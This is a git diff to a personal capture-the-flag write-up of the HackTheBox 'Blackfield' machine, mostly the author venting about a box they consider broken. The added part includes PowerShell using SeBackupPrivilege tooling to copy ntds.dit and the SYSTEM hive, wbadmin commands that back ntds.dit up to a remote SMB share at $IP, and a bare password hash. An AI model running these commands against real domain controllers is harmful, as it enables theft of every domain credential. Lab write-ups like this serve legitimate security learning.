@@ -1,7 +1,23 @@
 # Blackfield Writeup
 
+## Authors Warning with defining this.. 
+
+I did everything up dumping SAM and SYSTEM hives then I failed for about 2 hours. Here are my arguments to calling this a Writeup, but I almost called a Helped-Thorough twice during the subsequent hour of deliberating and WTFisThis machine too.
+
+- if Kerberos can sign a ticket with one hash, but you cannot login with kerberos with either ticket generated from each hash 
+- Why should it be possible to backup ntds.dit to smb server that is not even domain joined, but not robocopy ntds.dit and security hive when you can copy with `reg`,`robocopy` and `copy` both SAM and System hives. 
+- Use CAN use an ELEVEN year old C# .dll on a domain controller in 2019 to abuse the SeBackupPrivilege
+- Normally SeBackupPrivilege and SeRestorePrivilege give you read/write permission ... 
+-  I got all the way to the end without hints or writeup, but did not consider the weirdness expressed above.
+- The way lots of people got root.txt with `cipher /c root.txt` before the patch
+
+
+For the big sighs my notes contained:
+![1080](haditinmynotestoo.png)
+
+
 Name: Blackfield
-Date:  
+Date:  13/1/2024
 Difficulty:  Hard
 Goals:  
 - Four hours then Helped-Through, but it will probably be a Helped-Through
@@ -11,8 +27,10 @@ Learnt:
 - Sometimes I am correct 
 - DOWNLOAD THE SYMBOL TABLES IDIOT 
 - GitHub does not have a facepalm emoji, the one time I actually would like to use an emoji and join in
+- Windows Sysadmin Backup and Restore
 Beyond Root:
 - Active-Directory-Recon improvements
+
 
 - [[Blackfield-Notes.md]]
 - [[Blackfield-CMD-by-CMDs.md]]
@@ -264,15 +282,85 @@ Some whining later I resorted to `robocopy`
 
 ![](verysadwmiexec.png)
 
+Return double check knowing the Administrators is not in the Remote Desktop Users Group, but for writeup and deduction only.
+![](doublechecking.png)
+
+The power of collecting all the Hacking Information is always that you stumble back onto information that is very helpful - why not try the `attrib` command in KOTH/Battlegrounds platforms `attrib` is useful in hiding files from other players that do not know that feature exists  
+![](becauseiwantcyberbloodonthebattelgroundofhtborkothoneday.png)
+But SeBackup privileges
+![](sadattrib.png)
+
+RTFM for `robocopy /M` which failed
+
+![](ntdsdit.png)
+We can't dump NTDS.dit there is no:
+![](thereisnosecurityhive.png)
 
 
+![](bestpowershellspaniardformyblackfieldwrteupthx.png)
+
+`7f1e4ff8c6a8e6b6fcae2d9c0572cd62`
+
+![](whyadminwhy.png)
+
+![](retickingadmin.png)
+
+This seems weird, but I guess that something is weird about this machine for the final flag
+![](weirdkerberos.png)
+
+Maybe it is not my fault. But I saw someone as the Administrator so probably just need to use robocopy to backup the literal path not the reg command relative path.
+![](hintintoaoh.png)
+
+I still could not `robocopy` or `copy` the SECURITY hive.  
+
+![](somethingiswrong.png)
+
+![](hints2.png)
+
+From reading the fourms this box was probably broken and then fixed.[0xdf](https://0xdf.gitlab.io/2020/10/03/htb-blackfield.html#beyond-root---efs) wrote that you could just `cipher /c root.txt` from `svc_backup`. I decide to keep this a write up as if you had this access to the DC, both SECURITY and NTDS.dit would not have these weird permissions *if* I then could not restore them some how.
+![](weshouldautomaticallyhavethesepermissions.png)
+
+The good and bad news. I have rooted the box and this will remain a writeup . The bad news is box is broken 
+
+I cant do this so this should not be possible
+![](accessdenied.png)
+And this contains a different hash
+![](Ididthisitisthesamehaswhynowork.png)
+
+`C:\programdata` I wrote SAM and SYSTEM hive to this directory...
+
+- [Acl-FullControl.ps1](https://raw.githubusercontent.com/Hackplayers/PsCabesha-tools/master/Privesc/Acl-FullControl.ps1) - did not work
+- [SeBackupPrivilege](https://github.com/giuliano108/SeBackupPrivilege) - its eleven years old
+```powershell
+import-module .\SeBackupPrivilegeCmdLets.dll
+import-module .\SeBackupPrivilegeUtils.dll
+Copy-FileSeBackupPrivilege h:\windows\ntds\ntds.dit c:\windows\temp\NTDS -
+Overwrite
+Copy-FileSeBackupPrivilege h:\windows\system32\config\SYSTEM
+c:\windows\temp\SYSTEM -Overwrite
+```
+
+```powershell
+# Do not use impacket-smbserver as require NTFS/ReFS 
+
+echo "Y" | wbadmin start backup -backuptarget:\\$IP\Share -include:c:\windows\ntds
+
+wbadmin get versions
+
+echo "Y" | wbadmin start recovery -version:$TIMEFROMVERSION -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
+```
+
+
+Why should this work is using the Windows API to do the same with cat or `robocopy` `copy` do not work.
+![](guilianocmdtocopy.png)
 ## Post-Root-Reflection  
 
 - Yes the obvious answer is good, but sometimes the answer you did not know `vol` does not work have fun is the unfortunate state of the machine and the truth.
 - I need a Forensics box with volatility working.
 - I did it all by myself!
 - I troubleshooted issues myself
-
+- There are alot more ways to abuses SeBackup and SeRestore
+- 
 ## Beyond Root
 
 
